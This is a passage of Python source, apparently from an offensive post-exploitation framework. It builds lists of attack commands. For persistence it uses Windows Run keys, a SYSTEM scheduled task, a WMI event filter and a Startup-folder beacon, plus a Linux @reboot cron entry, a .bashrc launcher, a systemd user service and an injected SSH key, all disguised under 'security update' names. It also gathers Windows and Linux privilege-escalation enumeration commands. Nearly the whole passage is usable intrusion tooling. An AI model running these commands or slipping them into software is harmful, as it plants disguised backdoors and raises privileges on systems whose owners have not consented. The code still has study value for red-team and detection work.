                    "cleanup": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityUpdate /f"
                },
                # Scheduled task persistence  
                {
                    "method": "scheduled_task",
                    "command": "schtasks /create /tn SecurityCheck /tr powershell.exe /sc onlogon /ru SYSTEM",
                    "location": "Task Scheduler",
                    "cleanup": "schtasks /delete /tn SecurityCheck /f"
                },
                # WMI persistence
                {
                    "method": "wmi_event",
                    "command": "wmic /namespace:\\\\root\\subscription path __EventFilter create Name=\"SecurityFilter\", EventNameSpace=\"root\\cimv2\", QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System'\"",
                    "location": "WMI Repository",
                    "cleanup": "wmic /namespace:\\\\root\\subscription path __EventFilter where Name=\"SecurityFilter\" delete"
                },
                # Startup folder persistence
                {
                    "method": "startup_folder",
                    "command": "copy beacon.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityUpdate.exe\"",
                    "location": "Startup Folder",
                    "cleanup": "del \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityUpdate.exe\""
                }
            ]

            for method in windows_persistence:
                results["persistence_methods"].append({
                    "method": method["method"],
                    "command": method["command"],
                    "task_id": f"persist_{method['method']}",
                    "status": "pending",
                    "location": method["location"],
                    "cleanup_command": method["cleanup"]
                })

        else:  # Linux/Unix
            # Linux LotL persistence
            linux_persistence = [
                # Crontab persistence
                {
                    "method": "crontab",
                    "command": "(crontab -l 2>/dev/null; echo \"@reboot /tmp/.security_update\") | crontab -",
                    "location": "Crontab",
                    "cleanup": "crontab -l | grep -v security_update | crontab -"
                },
                # Bashrc persistence
                {
                    "method": "bashrc",
                    "command": "echo 'nohup /tmp/.security_update &' >> ~/.bashrc",
                    "location": "~/.bashrc",
                    "cleanup": "sed -i '/security_update/d' ~/.bashrc"
                },
                # Systemd service persistence
                {
                    "method": "systemd",
                    "command": "systemctl --user enable --now security-update.service",
                    "location": "Systemd User Services",
                    "cleanup": "systemctl --user disable --now security-update.service"
                },
                # SSH authorized_keys
                {
                    "method": "ssh_keys",
                    "command": "echo 'ssh-rsa AAAAB3...' >> ~/.ssh/authorized_keys",
                    "location": "~/.ssh/authorized_keys",
                    "cleanup": "sed -i '/AAAAB3/d' ~/.ssh/authorized_keys"
                }
            ]

            for method in linux_persistence:
                results["persistence_methods"].append({
                    "method": method["method"],
                    "command": method["command"],
                    "task_id": f"persist_{method['method']}",
                    "status": "pending",
                    "location": method["location"],
                    "cleanup_command": method["cleanup"]
                })

        return results

    def advanced_privilege_escalation(self, target_host: str, target_os: str) -> Dict[str, Any]:
        """
        ⬆️ Técnicas avançadas de escalação de privilégios
        """
        results = {
            "privilege_escalation_vectors": [],
            "kernel_exploits": [],
            "service_exploits": [],
            "dll_hijacking": [],
            "token_impersonation": []
        }

        if self.logger:
            self.logger.info(f"⬆️ Buscando vetores de escalação de privilégios em {target_host}")

        if "windows" in target_os.lower():
            # Windows privilege escalation
            windows_privesc = [
                # Service exploits
                {
                    "vector": "unquoted_service_path",
                    "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\" | findstr /i /v \"\"",
                    "description": "Unquoted service paths"
                },
                {
                    "vector": "weak_service_permissions",
                    "command": "accesschk.exe -uwcqv \"Authenticated Users\" *",
                    "description": "Weak service permissions"
                },
                # DLL hijacking
                {
                    "vector": "dll_hijacking",
                    "command": "procmon.exe /AcceptEula /Quiet /Minimized /BackingFile temp.pml",
                    "description": "DLL hijacking opportunities"
                },
                # Token impersonation
                {
                    "vector": "token_impersonation",
                    "command": "whoami /priv | findstr \"SeImpersonatePrivilege\\|SeAssignPrimaryTokenPrivilege\"",
                    "description": "Token impersonation privileges"
                },
                # Kernel exploits
                {
                    "vector": "kernel_exploit",
                    "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\"",
                    "description": "Kernel version check for exploits"
                }
            ]

            for vector in windows_privesc:
                results["privilege_escalation_vectors"].append({
                    "vector": vector["vector"],
                    "command": vector["command"],
                    "description": vector["description"],
                    "task_id": f"privesc_{vector['vector']}",
                    "status": "pending"
                })

        else:  # Linux/Unix
            # Linux privilege escalation
            linux_privesc = [
                # SUID binaries
                {
                    "vector": "suid_binaries",
                    "command": "find / -perm -4000 -type f 2>/dev/null",
                    "description": "SUID binaries enumeration"
                },
                # Sudo configuration
                {
                    "vector": "sudo_misconfig",
                    "command": "sudo -l",
                    "description": "Sudo misconfigurations"
                },
                # Kernel exploits
                {
                    "vector": "kernel_exploit",
                    "command": "uname -a && cat /etc/os-release",
                    "description": "Kernel version for exploit matching"
                },
                # Cron jobs
                {
                    "vector": "cron_jobs",
                    "command": "cat /etc/crontab && ls -la /etc/cron.*",
                    "description": "Writable cron jobs"
                },
                # Capabilities
                {
                    "vector": "capabilities",
                    "command": "getcap -r / 2>/dev/null",
                    "description": "File capabilities enumeration"
                }
            ]

            for vector in linux_privesc:
                results["privilege_escalation_vectors"].append({
                    "vector": vector["vector"],
                    "command": vector["command"],
                    "description": vector["description"],
                    "task_id": f"privesc_{vector['vector']}",
                    "status": "pending"
                })

        return results